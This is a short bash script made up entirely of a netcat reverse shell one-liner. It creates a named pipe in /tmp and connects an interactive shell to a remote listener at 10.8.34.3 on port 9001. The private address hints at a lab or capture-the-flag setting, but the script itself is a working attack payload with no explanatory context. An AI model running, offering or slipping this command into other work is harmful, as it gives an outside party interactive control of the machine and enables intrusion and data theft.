#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.34.3 9001 >/tmp/f
